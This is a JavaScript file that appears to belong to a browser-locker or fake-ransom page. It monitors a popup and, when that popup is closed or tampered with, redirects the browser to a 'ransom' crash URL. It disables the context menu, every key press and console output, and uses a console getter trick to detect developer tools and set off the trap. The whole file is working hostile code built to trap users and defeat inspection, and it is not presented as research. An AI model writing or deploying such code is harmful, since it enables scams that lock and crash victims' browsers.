// Check if window has closed
function detectClose(w, target) {
    const X = window.screenX;
    const Y = window.screenY;
    const lockerId = crypto.randomUUID();
  
    try {
      w.lockerId = lockerId;
    } catch {
      trap();
    }
    
    var timer = setInterval(function () {
      // Detect window close
      try {
        if (w.location.href !== target || w.closed || w.lockerId !== lockerId) throw 'Cant verify window';
      } catch {
        trap();
      }
    }, 200);
}

function defence() {
    // Prevent console.log
    console.log = function() {}
    // Prevent Context menu
    document.addEventListener('contextmenu', event => event.preventDefault());
    // Prevent shortcuts
    document.addEventListener('keydown', event => event.preventDefault());
    // Prevent Typing
    document.addEventListener('keypress', event => event.preventDefault());
    // Detect DevTools
    var element = new Image();
    Object.defineProperty(element, 'id', {
        get: function () {
            trap();
        }
    });
	
    requestAnimationFrame(function check() {
        console.dir(element);
        requestAnimationFrame(check);
    });
}

function trap() {
	// Only run once
	window.trap = () => {};
	window.location.href = "https://ransom.ndev.tk/crash/";
}
